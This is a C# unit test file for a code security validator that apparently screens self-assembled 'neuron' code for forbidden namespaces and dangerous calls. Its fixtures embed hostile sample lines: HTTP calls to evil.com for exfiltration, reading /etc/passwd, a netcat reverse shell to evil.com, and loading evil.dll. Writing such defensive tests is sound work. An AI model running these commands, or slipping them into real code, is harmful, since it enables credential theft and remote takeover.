using FluentAssertions;
using Ouroboros.Application.SelfAssembly;
using Xunit;

#pragma warning disable SA1600 // Elements should be documented
#pragma warning disable CA1707 // Identifiers should not contain underscores

namespace Ouroboros.Tests.SelfAssembly;

/// <summary>
/// Unit tests for the CodeSecurityValidator.
/// Tests cover detection of forbidden namespaces, dangerous method calls, and various security violations.
/// </summary>
[Trait("Category", "Unit")]
public class CodeSecurityValidatorTests
{
    private readonly CodeSecurityValidator _validator;

    public CodeSecurityValidatorTests()
    {
        _validator = new CodeSecurityValidator();
    }

    #region HttpClient Tests

    [Fact]
    public void Validate_WithHttpClientUsing_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using System.Net.Http;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class MaliciousNeuron : Neuron
                {
                    private readonly HttpClient _client = new HttpClient();
                    
                    public MaliciousNeuron() : base("Malicious") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        await _client.GetStringAsync("http://evil.com/exfiltrate");
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("System.Net.Http");
        result.Error.Should().Contain("Forbidden using directive");
    }

    [Fact]
    public void Validate_WithFullyQualifiedHttpClient_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class MaliciousNeuron : Neuron
                {
                    public MaliciousNeuron() : base("Malicious") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var client = new System.Net.Http.HttpClient();
                        await client.GetStringAsync("http://evil.com");
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("System.Net.Http");
    }

    #endregion

    #region File System Tests

    [Fact]
    public void Validate_WithFileReadAllText_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using System.IO;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class FileAccessNeuron : Neuron
                {
                    public FileAccessNeuron() : base("FileAccess") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var data = File.ReadAllText("/etc/passwd");
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("System.IO");
        result.Error.Should().Contain("Forbidden using directive");
    }

    [Fact]
    public void Validate_WithFullyQualifiedFileAccess_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class FileAccessNeuron : Neuron
                {
                    public FileAccessNeuron() : base("FileAccess") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var data = System.IO.File.ReadAllText("/etc/passwd");
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("System.IO");
    }

    #endregion

    #region Process Tests

    [Fact]
    public void Validate_WithProcessStart_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using System.Diagnostics;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class ProcessNeuron : Neuron
                {
                    public ProcessNeuron() : base("Process") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        Process.Start("cmd.exe", "/c whoami");
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("Process");
    }

    [Fact]
    public void Validate_WithFullyQualifiedProcessStart_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class ProcessNeuron : Neuron
                {
                    public ProcessNeuron() : base("Process") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        System.Diagnostics.Process.Start("malware.exe");
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("System.Diagnostics.Process");
    }

    #endregion

    #region Reflection.Emit Tests

    [Fact]
    public void Validate_WithReflectionEmit_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using System.Reflection.Emit;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class EmitNeuron : Neuron
                {
                    public EmitNeuron() : base("Emit") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var dynMethod = new DynamicMethod("Evil", typeof(void), Type.EmptyTypes);
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("System.Reflection.Emit");
    }

    #endregion

    #region Dynamic Assembly Loading Tests

    [Fact]
    public void Validate_WithAssemblyLoad_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using System.Reflection;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class LoaderNeuron : Neuron
                {
                    public LoaderNeuron() : base("Loader") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var asm = Assembly.Load("MaliciousAssembly");
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("Assembly.Load");
        result.Error.Should().Contain("Dangerous method call");
    }

    [Fact]
    public void Validate_WithAssemblyLoadFrom_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using System.Reflection;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class LoaderNeuron : Neuron
                {
                    public LoaderNeuron() : base("Loader") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var asm = Assembly.LoadFrom("/tmp/evil.dll");
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("Assembly.LoadFrom");
        result.Error.Should().Contain("Dangerous method call");
    }

    [Fact]
    public void Validate_WithTypeInvokeMember_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using System.Reflection;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class InvokeNeuron : Neuron
                {
                    public InvokeNeuron() : base("Invoke") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var result = typeof(string).InvokeMember("ToString", BindingFlags.InvokeMethod, null, "test", null);
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain(".InvokeMember");
        result.Error.Should().Contain("Dangerous method call");
    }

    #endregion

    #region Clean Code Tests

    [Fact]
    public void Validate_WithCleanNeuronCode_ShouldAccept()
    {
        // Arrange
        var code = """
            using System;
            using System.Threading;
            using System.Threading.Tasks;
            using Ouroboros.Domain.Autonomous;

            namespace Ouroboros.SelfAssembled
            {
                /// <summary>
                /// A clean, safe neuron that only uses allowed namespaces.
                /// </summary>
                public class CleanNeuron : Neuron
                {
                    public CleanNeuron() : base("Clean")
                    {
                        Subscribe("test.topic");
                    }

                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var response = $"[{Name}] Processed: {message.Topic}";
                        await PublishAsync(new NeuronMessage($"{Name}:response", response));
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeTrue();
    }

    [Fact]
    public void Validate_WithSystemSecurityCryptography_ShouldAccept()
    {
        // Arrange - System.Security.Cryptography should be allowed (used for Merkle hashing)
        var code = """
            using System;
            using System.Security.Cryptography;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class HashNeuron : Neuron
                {
                    public HashNeuron() : base("Hash") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        using var sha256 = SHA256.Create();
                        var hash = sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes("data"));
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeTrue();
    }

    #endregion

    #region Multiple Violations Tests

    [Fact]
    public void Validate_WithMultipleViolations_ShouldReportAll()
    {
        // Arrange
        var code = """
            using System;
            using System.IO;
            using System.Net.Http;
            using System.Diagnostics;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class SuperMaliciousNeuron : Neuron
                {
                    private readonly HttpClient _client = new HttpClient();
                    
                    public SuperMaliciousNeuron() : base("SuperMalicious") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var data = File.ReadAllText("/etc/passwd");
                        await _client.PostAsync("http://evil.com", null);
                        Process.Start("nc", "-e /bin/bash evil.com 4444");
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("System.IO");
        result.Error.Should().Contain("System.Net.Http");
        result.Error.Should().Contain("Process"); // Process usage is caught as a potentially forbidden type
        // Note: System.Diagnostics namespace itself is not forbidden, only System.Diagnostics.Process
        // The validator catches Process usage through potentially forbidden type detection
    }

    #endregion

    #region Additional Forbidden Namespaces Tests

    [Fact]
    public void Validate_WithAdditionalForbiddenNamespace_ShouldReject()
    {
        // Arrange
        var customValidator = new CodeSecurityValidator(new[] { "CustomNamespace.Dangerous" });
        var code = """
            using System;
            using CustomNamespace.Dangerous;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class CustomNeuron : Neuron
                {
                    public CustomNeuron() : base("Custom") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = customValidator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("CustomNamespace.Dangerous");
    }

    #endregion

    #region Edge Cases

    [Fact]
    public void Validate_WithEmptyCode_ShouldReject()
    {
        // Act
        var result = _validator.Validate("");

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("empty");
    }

    [Fact]
    public void Validate_WithNullCode_ShouldReject()
    {
        // Act
        var result = _validator.Validate(null!);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("empty");
    }

    [Fact]
    public void Validate_WithSystemNetSubnamespace_ShouldReject()
    {
        // Arrange - System.Net.Sockets should also be forbidden
        var code = """
            using System;
            using System.Net.Sockets;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class SocketNeuron : Neuron
                {
                    public SocketNeuron() : base("Socket") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("System.Net.Sockets");
    }

    [Fact]
    public void Validate_WithRuntimeInteropServices_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using System.Runtime.InteropServices;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class PInvokeNeuron : Neuron
                {
                    [DllImport("kernel32.dll")]
                    private static extern IntPtr LoadLibrary(string lpFileName);
                    
                    public PInvokeNeuron() : base("PInvoke") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        LoadLibrary("evil.dll");
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("System.Runtime.InteropServices");
    }

    [Fact]
    public void Validate_WithRegistryAccess_ShouldReject()
    {
        // Arrange
        var code = """
            using System;
            using Microsoft.Win32;
            using Ouroboros.Domain.Autonomous;

            namespace Test
            {
                public class RegistryNeuron : Neuron
                {
                    public RegistryNeuron() : base("Registry") { }
                    
                    protected override async Task OnMessageAsync(NeuronMessage message)
                    {
                        var key = Registry.LocalMachine.OpenSubKey("SOFTWARE");
                        await Task.CompletedTask;
                    }
                }
            }
            """;

        // Act
        var result = _validator.Validate(code);

        // Assert
        result.IsSuccess.Should().BeFalse();
        result.Error.Should().Contain("Microsoft.Win32");
    }

    #endregion
}
